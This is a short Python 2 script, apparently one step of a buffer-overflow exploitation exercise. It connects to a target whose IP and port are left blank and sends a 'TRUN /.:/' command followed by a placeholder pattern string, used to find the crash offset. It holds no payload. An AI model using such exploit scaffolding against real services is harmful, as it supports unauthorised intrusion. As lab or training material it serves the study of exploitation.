#! /usr/bin/python

#offset.py


import sys, socket 

# we paste the pattern in the offset 

offset = " "

try:

	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(('' , '')) # windows ip and port to be given in 

	s.send(('TRUN /.:/' + offset))
	s.close()

except:

	print "Eroor connecting to the server "	
	sys.exit()

# chmod  +x offset.py
